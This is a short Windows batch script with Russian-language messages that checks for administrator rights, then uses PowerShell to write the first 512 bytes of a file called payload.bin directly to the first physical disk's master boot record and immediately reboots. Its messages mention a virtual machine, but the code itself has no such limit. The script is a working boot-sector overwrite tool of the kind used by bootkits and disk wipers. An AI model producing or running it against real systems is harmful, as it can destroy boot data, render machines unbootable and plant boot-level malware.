@echo off
color 0c
chcp 65001 > nul

echo [INFO] Запуск скрипта...
:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] ОШИБКА: Запусти этот скрипт именно от имени Администратора!
    goto end
)

echo [INFO] Права администратора подтверждены.
echo [INFO] Проверяем наличие файла payload.bin...

if not exist "payload.bin" (
    echo [!] ОШИБКА: Файл payload.bin не найден в этой папке!
    goto end
)

echo [INFO] Файл payload.bin на месте. Попытка записи в MBR...

:: Запись через PowerShell с выводом ошибок на экран
powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload.bin'); $stream = [io.file]::OpenWrite('\\.\PhysicalDrive0'); $stream.Write($bytes, 0, 512); $stream.Close();"

if %errorlevel% neq 0 (
    echo [!] ОШИБКА: PowerShell не смог записать данные в диск!
    goto end
)

echo [OK] Запись прошла успешно!
echo Перезагрузка виртуальной машины...
shutdown /r /t 0

:end
echo.
echo Нажми любую клавишу, чтобы закрыть окно...
pause > nul
